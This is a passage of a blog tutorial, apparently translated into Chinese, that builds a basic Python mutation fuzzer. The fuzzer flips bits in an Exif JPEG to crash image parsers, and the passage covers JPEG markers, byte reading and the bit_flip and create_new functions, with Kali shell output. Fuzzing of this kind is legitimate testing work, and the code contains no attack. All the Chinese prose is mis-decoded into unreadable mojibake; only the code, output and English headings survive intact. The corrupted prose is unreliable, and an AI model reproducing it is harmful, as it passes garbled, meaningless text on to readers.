Started</h2><p>æˆ‘ä»¬å°†ç”¨<code>Python3</code>å»æ„å»ºä¸€ä¸ªåˆçº§çš„å˜å¼‚çš„<code>fuzzer</code>ï¼Œå·§å¦™åœ°ï¼ˆæˆ–è€…ä¸é‚£ä¹ˆå·§å¦™åœ°ï¼‰æ”¹å˜åˆè§„çš„<code>Exif-filled</code>çš„<code>JPEGs</code>ï¼Œå¹¶å°†å®ƒä»¬å–‚ç»™è§£æå™¨å¸Œæœ›èƒ½å¾—åˆ°<code>crash</code>ï¼Œæˆ‘ä»¬è¿˜å°†å¼€å‘<code>x86 Kali Linux</code>å‘è¡Œç‰ˆã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåˆè§„çš„<code>Exif-filled</code>çš„<code>JPEG</code>ï¼Œè°·æ­Œæœç´ <code>Sample JPEG with Exif</code>å°±æœ‰åŠ©äºæˆ‘ä»¬æ‰¾åˆ°è¿™ä¸ª<a href="https://github.com/ianare/exif-samples/tree/master/jpg">repo</a>ï¼Œæˆ‘å°†ä¼šç”¨<code>Canon_40D.jpg</code>ç”¨äºæµ‹è¯•ã€‚</p><h2 id="Getting-to-Know-the-JPEG-and-EXIF-Spec"><a href="#Getting-to-Know-the-JPEG-and-EXIF-Spec" class="headerlink" title="Getting to Know the JPEG and EXIF Spec"></a>Getting to Know the JPEG and EXIF Spec</h2><p>åœ¨æˆ‘ä»¬å°†<code>Python</code>å†™å…¥<code>Sublime Text</code>ä¹‹å‰ï¼Œè®©æˆ‘ä»¬é¦–å…ˆèŠ±ä¸€ç‚¹æ¥äº†è§£<code>JPEG</code>å’Œ<code>Exif</code>è§„èŒƒï¼Œä¸€éæˆ‘ä»¬å¯ä»¥é¿å…ä¸€äº›æ›´æ˜æ˜¾çš„æŸåå›¾åƒï¼Œä»¥è‡³äºè§£æå™¨ä¸ä¼šè¯•å›¾è§£æå®ƒä»¥æµªè´¹å®è´µçš„<code>fuzzing cycles</code>ã€‚</p><p>ä»å‰æ–‡æåˆ°çš„<a href="https://www.media.mit.edu/pia/Research/deepview/exif.html">è§„èŒƒæ¦‚è¿°</a>å¯çŸ¥æ‰€æœ‰çš„<code>JPEG</code>å›¾ç‰‡éƒ½æ˜¯ä»¥<code>0xFFD8</code>å¼€å¤´ï¼Œä»¥<code>0xFFD9</code>ç»“å°¾ï¼Œè¿™å‰å‡ ä¸ªå­—èŠ‚å°±æ˜¯æ‰€è°“çš„<code>magic bytes</code>ï¼Œåœ¨<code>*Nix system</code>ä¸­é€šè¿‡<code>magic bytes</code>å¯ä»¥ç›´æ¥è¯†åˆ«å‡ºæ–‡ä»¶ç±»å‹ã€‚</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# file Canon_40D.jpg Canon_40D.jpg: JPEG image data, JFIF standard <span class="hljs-number">1.01</span>, resolution (DPI), density <span class="hljs-number">72</span>x72, segment length <span class="hljs-number">16</span>, Exif Standard: [TIFF image data, little-endian, direntries=<span class="hljs-number">11</span>, manufacturer=Canon, model=Canon EOS <span class="hljs-number">40</span>D, orientation=upper-left, xresolution=<span class="hljs-number">166</span>, yresolution=<span class="hljs-number">174</span>, resolutionunit=<span class="hljs-number">2</span>, software=GIMP <span class="hljs-number">2.4</span><span class="hljs-number">.5</span>, datetime=<span class="hljs-number">2008</span>:<span class="hljs-number">07</span>:<span class="hljs-number">31</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">11</span>, GPS-Data], baseline, precision <span class="hljs-number">8</span>, <span class="hljs-number">100</span>x68, components <span class="hljs-number">3</span></code></pre><p>æˆ‘ä»¬å¯ä»¥å»æ‰<code>.jpg</code>å¹¶è·å¾—ç›¸åŒçš„è¾“å‡º</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# file CanonCanon: JPEG image data, JFIF standard <span class="hljs-number">1.01</span>, resolution (DPI), density <span class="hljs-number">72</span>x72, segment length <span class="hljs-number">16</span>, Exif Standard: [TIFF image data, little-endian, direntries=<span class="hljs-number">11</span>, manufacturer=Canon, model=Canon EOS <span class="hljs-number">40</span>D, orientation=upper-left, xresolution=<span class="hljs-number">166</span>, yresolution=<span class="hljs-number">174</span>, resolutionunit=<span class="hljs-number">2</span>, software=GIMP <span class="hljs-number">2.4</span><span class="hljs-number">.5</span>, datetime=<span class="hljs-number">2008</span>:<span class="hljs-number">07</span>:<span class="hljs-number">31</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">11</span>, GPS-Data], baseline, precision <span class="hljs-number">8</span>, <span class="hljs-number">100</span>x68, components <span class="hljs-number">3</span></code></pre><p>å¦‚æœæˆ‘ä»¬ <code>hexdump</code> è¿™ä¸ªå›¾ç‰‡ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ€åˆçš„å‡ ä¸ªå­—èŠ‚å’Œæœ€åçš„å‡ ä¸ªå­—èŠ‚å®é™…ä¸Šå°±æ˜¯<code>0xFFD8</code>å’Œ<code>0xFFD9</code></p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# hexdump Canon<span class="hljs-number">0000000</span> d8ff e0ff <span class="hljs-number">1000</span> <span class="hljs-number">464</span>a <span class="hljs-number">4649</span> <span class="hljs-number">0100</span> <span class="hljs-number">0101</span> <span class="hljs-number">4800</span>------SNIP------<span class="hljs-number">0001f</span>10 <span class="hljs-number">5</span>aed <span class="hljs-number">5158</span> d9ff</code></pre><p>åœ¨è§„èŒƒæ¦‚è¿°ä¸­å¦å¤–ä¸€ä¸ªæœ‰è¶£çš„ä¿¡æ¯æ˜¯<code>markers</code>æ˜¯ä»¥<code>0xFF</code>å¼€å¤´çš„ï¼Œæœ‰å‡ ç§ä¸€ç›´çš„é™æ€æ ‡è®° (<code>marders</code>) ä¾‹å¦‚ï¼š</p><ul><li>the â€˜Start of Imageâ€™(SOI) marker: 0xFFD8</li><li>APP1 marker: 0xFFE1</li><li>generic markers: 0xFFXX</li><li>the â€˜End of Imageâ€™(EOI) marker: 0xFFD9</li></ul><p>å› ä¸ºæˆ‘ä»¬ä¸åƒå»æ”¹å˜<code>image</code>çš„é•¿åº¦æˆ–è€…æ–‡ä»¶çš„ç±»å‹ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬ç»§ç»­å¹¶è®¡åˆ’å°½å¯èƒ½ä¿æŒ<code>SOI</code>å’Œ<code>EOI</code>æ ‡è®°å®Œæ•´ï¼Œæˆ‘ä»¬å¹¶ä¸æƒ³æ’å…¥<code>0xFFD9</code>åˆ°å›¾åƒä¸­é—´ï¼Œä»¥è‡³äºè¿™ä¼šæˆªæ–­å›¾åƒæˆ–è€…å¯¼è‡´è§£æå™¨ä»¥<code>non-crashy way</code>è€Œäº§ç”Ÿæ··ä¹±ï¼ˆ<code>Non-crashy</code>å¹¶ä¸æ˜¯ä¸€ä¸ªçœŸå®çš„è¯ï¼‰ï¼Œè¿™ä¹Ÿå¯èƒ½ä¼šè¢«è¯¯å¯¼ä¹Ÿè®¸æˆ‘ä»¬ä¹Ÿåº”è¯¥åœ¨å­—èŠ‚æµä¸­éšæœºæ”¾ç½®<code>EOI</code>æ ‡è®°ï¼Ÿæ¥æˆ‘ä»¬è¯•è¯•çœ‹ã€‚</p><h2 id="Starting-Our-Fuzzer"><a href="#Starting-Our-Fuzzer" class="headerlink" title="Starting Our Fuzzer"></a>Starting Our Fuzzer</h2><p>è¿™æˆ‘ä»¬å°†åšçš„ç¬¬ä¸€ä»¶äº‹æƒ…å°±æ˜¯æå–<code>JPEG</code>ä¸­çš„æ‰€æœ‰å­—èŠ‚ï¼Œæˆ‘ä»¬å¸Œæœ›å°†å…¶ç”¨ä½œæˆ‘ä»¬çš„<code>valid</code>è¾“å…¥è“æœ¬ï¼Œå½“ç„¶æˆ‘ä»¬ä¼šå¯¹å…¶è¿›è¡Œå˜å¼‚ã€‚</p><p>æˆ‘ä»¬çš„ä»£ç å°†ä¼šä»å†™æˆè¿™æ ·å¼€å§‹ï¼š</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-keyword">import</span> sys<span class="hljs-comment"># read bytes from our valid JPEG and return them in a mutable bytearray </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_bytes</span>(<span class="hljs-params">filename</span>):</span>    f = open(filename, <span class="hljs-string">&quot;rb&quot;</span>).read()    <span class="hljs-keyword">return</span> bytearray(f)<span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:    print(<span class="hljs-string">&quot;Usage: JPEGfuzz.py &lt;valid_jpg&gt;&quot;</span>)<span class="hljs-keyword">else</span>:    filename = sys.argv[<span class="hljs-number">1</span>]    data = get_bytes(filename)</code></pre><p>å¦‚æœæˆ‘ä»¬å¸Œæœ›çœ‹åˆ°è¿™ä¸ªæ•°æ®æ˜¯é•¿ä»€ä¹ˆæ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ•°ç»„ä¸­æ‰“å°æœ€åˆ10ä¸ªå·¦å³çš„å­—èŠ‚å€¼ï¼Œç„¶åçœ‹çœ‹æˆ‘ä»¬å°†ä¼šå¦‚ä½•ä¸å…¶è¿›è¡Œäº¤äº’ï¼Œæˆ‘ä»¬å°†ä»…æ˜¯ä¸´æ—¶æ·»åŠ ä¸€äº›ç±»ä¼¼å¦‚ä¸‹çš„ä¸œè¥¿ï¼š</p><pre><code class="hljs python"><span class="hljs-keyword">else</span>:    filename = sys.argv[<span class="hljs-number">1</span>]    data = get_bytes(filename)    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data:        <span class="hljs-keyword">if</span> counter &lt; <span class="hljs-number">10</span>:            print(x)        counter += <span class="hljs-number">1</span></code></pre><p>è¿è¡Œè¿™ä¸ªï¼Œæ˜¾ç¤ºæˆ‘ä»¬æ­£å°†å…¶è½¬æ¢ä¸ºæ•´é½çš„åè¿›åˆ¶æ•´æ•°ï¼Œåœ¨æˆ‘çœ‹æ¥ï¼Œè¿™è®©ä¸€åˆ‡å˜å¾—æ›´ä¸ºå®¹æ˜“ã€‚</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# python3 fuzzer.py Canon_40D.jpg <span class="hljs-number">255</span><span class="hljs-number">216</span><span class="hljs-number">255</span><span class="hljs-number">224</span><span class="hljs-number">0</span><span class="hljs-number">16</span><span class="hljs-number">74</span><span class="hljs-number">70</span><span class="hljs-number">73</span><span class="hljs-number">70</span></code></pre><p>è®©æˆ‘ä»¬å¿«é€Ÿåœ°çœ‹çœ‹æ˜¯å¦å¯ä»¥ä»æˆ‘ä»¬çš„å­—èŠ‚æ•°ç»„ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„åˆè§„çš„ <code>JPEG</code>ï¼Œæˆ‘ä»¬å°†æŠŠè¿™ä¸ªå‡½æ•°æ·»åŠ åˆ°æˆ‘ä»¬çš„ä»£ç ä¸­å¹¶è¿è¡Œå®ƒã€‚</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_new</span>(<span class="hljs-params">data</span>):</span>    f = open(<span class="hljs-string">&quot;mutated.jpg&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span>)    f.write(data)    f.close()</code></pre><p>æ‰€ä»¥ç°åœ¨åœ¨æˆ‘ä»¬çš„å­—å…¸ä¸­å¯ä»¥è·å¾—ä¸€ä¸ª<code>mutated.jpg</code>ï¼Œè®©æˆ‘ä»¬<code>hash</code>æ¯”è¾ƒè¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œçœ‹å®ƒä»¬æ˜¯å¦åŒ¹é…çš„ä¸Š.</p><pre><code class="hljs llvm">root<span class="hljs-title">@kali</span>:~# shasum Canon_<span class="hljs-number">40</span>D.jpg mutated.jpg <span class="hljs-keyword">c</span><span class="hljs-number">3</span>d<span class="hljs-number">98686223</span>ad<span class="hljs-number">69</span>ea<span class="hljs-number">29</span><span class="hljs-keyword">c</span><span class="hljs-number">811</span>aaab<span class="hljs-number">35</span>d<span class="hljs-number">343</span>ff<span class="hljs-number">1</span>ae<span class="hljs-number">9</span>e  Canon_<span class="hljs-number">40</span>D.jpg<span class="hljs-keyword">c</span><span class="hljs-number">3</span>d<span class="hljs-number">98686223</span>ad<span class="hljs-number">69</span>ea<span class="hljs-number">29</span><span class="hljs-keyword">c</span><span class="hljs-number">811</span>aaab<span class="hljs-number">35</span>d<span class="hljs-number">343</span>ff<span class="hljs-number">1</span>ae<span class="hljs-number">9</span>e  mutated.jpg</code></pre><p>æœ‰è¶£ï¼Œæˆ‘ä»¬å¯ä»¥æœ‰ä¸¤ä¸ªç›¸åŒçš„æ–‡ä»¶ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥åœ¨åˆ›å»º<code>mutated.jpg</code>ä¹‹å‰å˜å¼‚æ•°æ®ã€‚</p><h2 id="Mutating"><a href="#Mutating" class="headerlink" title="Mutating"></a>Mutating</h2><p>æˆ‘ä»¬å°†ä¿æŒæˆ‘ä»¬çš„ <code>fuzzer</code> ç›¸å¯¹ç®€å•ï¼Œå¹¶ä¸”åªæ˜¯å®ç°ä¸¤ç§ä¸åŒçš„å˜å¼‚æ–¹å¼ï¼Œè¿™äº›æ–¹æ³•å¦‚ä¸‹ï¼š</p><ul><li>ä½ç¿»è½¬ï¼ˆ<code>bit flipping</code>ï¼‰</li><li>ç”¨<code>Gynvael&#39;s &#39;Magic Numbers&#39;</code>è¦†ç›–å­—èŠ‚åºåˆ—ï¼ˆ<code>overwriting byte sequences with Gynvaelâ€™s â€˜Magic Numbersâ€™</code>ï¼‰</li></ul><p>è®©æˆ‘ä»¬å¼€å§‹ä½ç¿»è½¬å§ï¼Œ<code>255</code>ï¼ˆ<code>0xFF</code>ï¼‰åœ¨äºŒè¿›åˆ¶ä¸­å°†æ˜¯<code>11111111</code>ï¼Œå¦‚æœæˆ‘ä»¬éšæœºç¿»è½¬è¿™ä¸ªæ•°å­—ä¸­çš„ä¸€ä½ï¼Œå‡è®¾åœ¨<code>index</code>æ•°å­—ä¸º<code>2</code>ï¼Œæˆ‘ä»¬å°†å¾—åˆ°<code>11011111</code>ï¼Œè¿™ä¸ªæ–°æ•°å­—ä¼šæ˜¯<code>223</code>ï¼ˆ<code>0xDF</code>ï¼‰ã€‚</p><p>æˆ‘ä¸èƒ½å®Œå…¨ç¡®è®¤è¿™ç§å˜å¼‚æ–¹å¼å’Œéšæœºé€‰æ‹©ä¸€ä¸ª<code>0-255</code>çš„æ•°å­—å¹¶ä¸”é‡å†™ä¸€ä¸ªæ–°çš„æ•°å­—æœ‰ç€ä»€ä¹ˆåŒºåˆ«ï¼Œæˆ‘çš„ç›´è§‰è¯´ä½ç¿»è½¬ä¸ç”¨ä»»æ„å­—èŠ‚éšæœºè¦†ç›–å­—èŠ‚éå¸¸ç›¸ä¼¼ã€‚</p><p>è®©æˆ‘ä»¬ç»§ç»­ï¼Œå‡è®¾æˆ‘ä»¬æƒ³å»ä»…ç¿»è½¬<code>1%</code>çš„æ¯”ç‰¹ï¼Œæˆ‘ä»¬åœ¨<code>Python</code>ä¸­é€šè¿‡å¦‚ä¸‹ä»£ç å¾—åˆ°è¿™ä¸ªæ•°å­—ã€‚</p><pre><code class="hljs lisp">num_of_flips = int((<span class="hljs-name">len</span>(<span class="hljs-name">data</span>) - <span class="hljs-number">4</span>) * .01)</code></pre><p>æˆ‘ä»¬æƒ³ä»æˆ‘ä»¬çš„å­—èŠ‚æ•°ç»„çš„é•¿åº¦ä¸­å‡å»4ï¼Œå› ä¸ºæˆ‘ä»¬ä¸æƒ³è®¡ç®—åœ¨æˆ‘ä»¬çš„æ•°ç»„ä¸­çš„æœ€åˆçš„ä¸¤ä¸ªå­—èŠ‚æˆ–æœ€åè¿ä¸ªå­—èŠ‚ï¼Œå› ä¸ºè¿™äº›æ˜¯<code>SOI</code>å’Œ<code>EOI</code>æ ‡è®°ï¼Œæˆ‘ä»¬æ„åœ¨ä¿æŒåŸæ ·ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°†æƒ³è¦éšæœºé€‰æ‹©è®¸å¤šçš„<code>indexes</code>ç„¶åå°†è¿™äº›<code>indexes</code>ä½œä¸ºä½ç¿»è½¬çš„ç›®æ ‡ï¼Œæˆ‘ä»¬å°†ç»§ç»­åˆ›å»ºä¸€ç»„å¯ä»¥ä¿®æ”¹çš„å¯èƒ½çš„<code>indexes</code>ï¼Œç„¶åé€‰æ‹©å…¶ä¸­çš„<code>num_of_flips</code>ä¸ªè¿›è¡Œéšæœºçš„ä½ç¿»è½¬ã€‚</p><pre><code class="hljs python">indexes = range(<span class="hljs-number">4</span>, (len(data) - <span class="hljs-number">4</span>))chosen_indexes = []<span class="hljs-comment"># iterate selecting indexes until we&#x27;ve hit our num_of_flips number</span>counter = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> counter &lt; num_of_flips:    chosen_indexes.append(random.choice(indexes))    counter += <span class="hljs-number">1</span></code></pre><p>è®©æˆ‘ä»¬æŠŠ<code>import random</code>åŠ åˆ°æˆ‘ä»¬çš„<code>script</code>ä¸­ï¼Œå¹¶æ·»åŠ è¿™äº›<code>debug</code>çš„<code>print</code>çŠ¶æ€ä»¥ç¡®ä¿æ‰€æœ‰çš„ä¸€åˆ‡éƒ½èƒ½æˆåŠŸè¿è½¬ã€‚</p><pre><code class="hljs python">print(<span class="hljs-string">&quot;Number of indexes chosen: &quot;</span> + str(len(chosen_indexes)))print(<span class="hljs-string">&quot;Indexes chosen: &quot;</span> + str(chosen_indexes))</code></pre><p>æˆ‘ä»¬çš„<code>function</code>ç°åœ¨æ˜¯åƒè¿™æ ·ï¼š</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bit_flip</span>(<span class="hljs-params">data</span>):</span>    num_of_flips = int((len(data) - <span class="hljs-number">4</span>) * <span class="hljs-number">.01</span>)    indexes = range(<span class="hljs-number">4</span>, (len(data) - <span class="hljs-number">4</span>))    chosen_indexes = []    <span class="hljs-comment"># iterate selecting indexes until we&#x27;ve hit our num_of_flips number</span>    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; num_of_flips:        chosen_indexes.append(random.choice(indexes))        counter += <span class="hljs-number">1</span>    print(<span class="hljs-string">&quot;Number of indexes chosen: &quot;</span> + str(len(chosen_indexes)))    print(<span class="hljs-string">&quot;Indexes chosen: &quot;</span> + str(chosen_indexes))</code></pre><p>å¦‚æœæˆ‘ä»¬è·‘è¿™ä¸ªè„šæœ¬ï¼Œæˆ‘ä»¬å°†ä¼šå¾—åˆ°ä¸€ä¸ªé¢„æœŸçš„ä¸é”™çš„è¾“å‡ºã€‚</p><pre><code class="hljs yaml"><span class="hljs-string">root@kali:~#</span> <span class="hljs-string">python3</span> <span class="hljs-string">fuzzer.py</span> <span class="hljs-string">Canon_40D.jpg</span> <span class="hljs-attr">Number of indexes chosen:</span> <span class="hljs-number">79</span><span class="hljs-attr">Indexes chosen:</span> [<span class="hljs-number">6580</span>, <span class="hljs-number">930</span>, <span class="hljs-number">6849</span>, <span class="hljs-number">6007</span>, <span class="hljs-number">5020</span>, <span class="hljs-number">33</span>, <span class="hljs-number">474</span>, <span class="hljs-number">4051</span>, <span class="hljs-number">7722</span>, <span class="hljs-number">5393</span>, <span class="hljs-number">3540</span>, <span class="hljs-number">54</span>, <span class="hljs-number">5290</span>, <span class="hljs-number">2106</span>, <span class="hljs-number">2544</span>, <span class="hljs-number">1786</span>, <span class="hljs-number">5969</span>, <span class="hljs-number">5211</span>, <span class="hljs-number">2256</span>, <span class="hljs-number">510</span>, <span class="hljs-number">7147</span>, <span class="hljs-number">3370</span>, <span class="hljs-number">625</span>, <span class="hljs-number">5845</span>, <span class="hljs-number">2082</span>, <span class="hljs-number">2451</span>, <span class="hljs-number">7500</span>, <span class="hljs-number">3672</span>, <span class="hljs-number">2736</span>, <span class="hljs-number">2462</span>, <span class="hljs-number">5395</span>, <span class="hljs-number">7942</span>, <span class="hljs-number">2392</span>, <span class="hljs-number">1201</span>, <span class="hljs-number">3274</span>, <span class="hljs-number">7629</span>, <span class="hljs-number">5119</span>, <span class="hljs-number">1977</span>, <span class="hljs-number">2986</span>, <span class="hljs-number">7590</span>, <span class="hljs-number">1633</span>, <span class="hljs-number">4598</span>, <span class="hljs-number">1834</span>, <span class="hljs-number">445</span>, <span class="hljs-number">481</span>, <span class="hljs-number">7823</span>, <span class="hljs-number">7708</span>, <span class="hljs-number">6840</span>, <span class="hljs-number">1596</span>, <span class="hljs-number">5212</span>, <span class="hljs-number">4277</span>, <span class="hljs-number">3894</span>, <span class="hljs-number">2860</span>, <span class="hljs-number">2912</span>, <span class="hljs-number">6755</span>, <span class="hljs-number">3557</span>, <span class="hljs-number">3535</span>, <span class="hljs-number">3745</span>, <span class="hljs-number">1780</span>, <span class="hljs-number">252</span>, <span class="hljs-number">6128</span>, <span class="hljs-number">7187</span>, <span class="hljs-number">500</span>, <span class="hljs-number">1051</span>, <span class="hljs-number">4372</span>, <span class="hljs-number">5138</span>, <span class="hljs-number">3305</span>, <span class="hljs-number">872</span>, <span class="hljs-number">6258</span>, <span class="hljs-number">2136</span>, <span class="hljs-number">3486</span>, <span class="hljs-number">5600</span>, <span class="hljs-number">651</span>, <span class="hljs-number">1624</span>, <span class="hljs-number">4368</span>, <span class="hljs-number">7076</span>, <span class="hljs-number">1802</span>, <span class="hljs-number">2335</span>, <span class="hljs-number">3553</span>]</code></pre><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å®é™…å˜å¼‚è¿™äº›<code>indexes</code>ä¸Šçš„å­—èŠ‚ï¼Œæˆ‘ä»¬éœ€è¦ä½ç¿»è½¬ä»–ä»¬ï¼Œæˆ‘é€‰æ‹©ç”¨ä¸€ä¸ªéå¸¸<code>hacky</code>çš„æ–¹å¼å»åšè¿™ä»¶äº‹ï¼Œä½ å°½å¯ä»¥éšæ„çš„å®ç°ä½ è‡ªå·±çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å‡†å¤‡è½¬æ¢è¿™äº›<code>indexes</code>ä¸Šçš„å­—èŠ‚åˆ°äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶è¡¥é½ä¸º8ä½æ•°é•¿ï¼Œè®©æˆ‘ä»¬æ·»åŠ è¿™ä¸ªä»£ç ï¼Œçœ‹çœ‹æˆ‘ä»¬åœ¨è¯´äº›ä»€ä¹ˆï¼Œæˆ‘ä»¬å°†ä¼šè½¬æ¢è¿™å­—èŠ‚çš„å€¼ï¼ˆå°±æ˜¯è½¬ä¸ºåè¿›åˆ¶ï¼‰åˆ°äºŒè¿›åˆ¶ä¸²ï¼Œå¹¶å¦‚æœå®ƒå°‘äº8ä½æ•°é•¿æ—¶åœ¨å…¶å‰é¢å¡«å……0ï¼Œè¿™æœ€åä¸€è¡Œå°±æ˜¯è°ƒè¯•æ—¶çš„ä¸´æ—¶æ‰“å°ã€‚</p><pre><code class="hljs python"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> chosen_indexes:    current = data[x]    current = (bin(current).replace(<span class="hljs-string">&quot;0b&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))    current = <span class="hljs-string">&quot;0&quot;</span> * (<span class="hljs-number">8</span> - len(current)) + current</code></pre><p>æ­£å¦‚ä½ æ‰€ç¤ºï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªä¸é”™çš„äºŒè¿›åˆ¶æ•°å­—ä½œä¸ºå­—ç¬¦ä¸²çš„è¾“å‡ºã€‚</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# python3 fuzzer.py Canon_40D.jpg <span class="hljs-number">10100110</span><span class="hljs-number">10111110</span><span class="hljs-number">10010010</span><span class="hljs-number">00110000</span><span class="hljs-number">01110001</span><span class="hljs-number">00110101</span><span class="hljs-number">00110010</span>-----SNIP-----</code></pre><p>ç°åœ¨å¯¹äºå…¶ä¸­çš„æ¯ä¸€ä¸ªï¼Œæˆ‘ä»¬å°†ä¼šéšæœºæŒ‘é€‰ä¸€ä¸ª<code>index</code>ç„¶åç¿»è½¬å®ƒï¼Œä¾‹å¦‚ï¼Œ<code>10100110</code>ï¼Œå¦‚æœé€‰æ‹©<code>index 0</code>ï¼Œæˆ‘ä»¬å¾—åˆ°æ˜¯<code>1</code>ï¼Œæˆ‘ä»¬å°†ä¼šç¿»è½¬å…¶æˆä¸º<code>0</code>ã€‚</p><p>è¿™æ®µä»£ç æ®µæœ€åçš„è€ƒè™‘æ˜¯è¿™äº›æ˜¯å­—ç¬¦ä¸²è€Œä¸æ˜¯æ•´æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åšçš„æœ€åä¸€ä»¶äº‹æƒ…å°±æ˜¯å°†ç¿»è½¬çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ã€‚</p><p>æˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªç©ºç™½çš„åˆ—è¡¨ã€æŠŠæ¯ä¸ªæ•°å­—é™å…¥è¿™ä¸ªåˆ—è¡¨ã€ç¿»è½¬æˆ‘ä»¬éšæœºæŒ‘é€‰çš„æ•°å­—ï¼Œç„¶åä»æ‰€æœ‰çš„åˆ—è¡¨æˆå‘˜ä¸­æ„é€ ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼ˆæˆ‘ä»¬å¿…é¡»ä½¿ç”¨è¿™ä¸ªä¸­é—´åˆ—è¡¨çš„æ­¥éª¤ï¼Œå› ä¸ºå­—ç¬¦ä¸²æ˜¯å¯å˜å¼‚çš„ï¼‰ï¼Œæœ€åæˆ‘ä»¬å°†å…¶è½¬æ¢ä¸ºæ•´æ•°ï¼Œç„¶åè¿”å›æ•°æ®ç»™æˆ‘ä»¬çš„<code>create_new()</code>å‡½æ•°ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„<code>JPEG</code>ã€‚</p><p>æˆ‘ä»¬çš„å…¨éƒ¨è„šæœ¬ç›®å‰æ˜¯åƒè¿™æ ·ï¼š</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> random<span class="hljs-comment"># read bytes from our valid JPEG and return them in a mutable bytearray </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_bytes</span>(<span class="hljs-params">filename</span>):</span>    f = open(filename, <span class="hljs-string">&quot;rb&quot;</span>).read()    <span class="hljs-keyword">return</span> bytearray(f)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bit_flip</span>(<span class="hljs-params">data</span>):</span>    num_of_flips = int((len(data) - <span class="hljs-number">4</span>) * <span class="hljs-number">.01</span>)    indexes = range(<span class="hljs-number">4</span>, (len(data) - <span class="hljs-number">4</span>))    chosen_indexes = []    <span class="hljs-comment"># iterate selecting indexes until we&#x27;ve hit our num_of_flips number</span>    counter = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> counter &lt; num_of_flips:        chosen_indexes.append(random.choice(indexes))        counter += <span class="hljs-number">1</span>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> chosen_indexes:        current = data[x]        current = (bin(current).replace(<span class="hljs-string">&quot;0b&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))        current = <span class="hljs-string">&quot;0&quot;</span> * (<span class="hljs-number">8</span> - len(current)) + current                indexes = range(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)        picked_index = random.choice(indexes)        new_number = []        <span class="hljs-comment"># our new_number list now has all the digits, example: [&#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;0&#x27;]</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> current:            new_number.append(i)        <span class="hljs-comment"># if the number at our randomly selected index is a 1, make it a 0, and vice versa</span>        <span class="hljs-keyword">if</span> new_number[picked_index] == <span class="hljs-string">&quot;1&quot;</span>:            new_number[picked_index] = <span class="hljs-string">&quot;0&quot;</span>        <span class="hljs-keyword">else</span>:            new_number[picked_index] = <span class="hljs-string">&quot;1&quot;</span>        <span class="hljs-comment"># create our new binary string of our bit-flipped number</span>        current = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> new_number:            current += i        <span class="hljs-comment"># convert that string to an integer</span>        current = int(current,<span class="hljs-number">2</span>)        <span class="hljs-comment"># change the number in our byte array to our new number we just constructed</span>        data[x] = current    <span class="hljs-keyword">return</span> data<span class="hljs-comment"># create new jpg with mutated data</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_new</span>(<span class="hljs-params">data</span>):</span>    f = open(<span class="hljs-string">&quot;mutated.jpg&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span>)    f.write(data)    f.close()<span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:    print(<span class="hljs-string">&quot;Usage: JPEGfuzz.py &lt;valid_jpg&gt;&quot;</span>)<span class="hljs-keyword">else</span>:    filename = sys.argv[<span class="hljs-number">1</span>]    data = get_bytes(filename)    mutated_data = bit_flip(data)    create_new(mutated_data)</code></pre><h2 id="Analyzing-Mutation"><a href="#Analyzing-Mutation" class="headerlink" title="Analyzing Mutation"></a>Analyzing 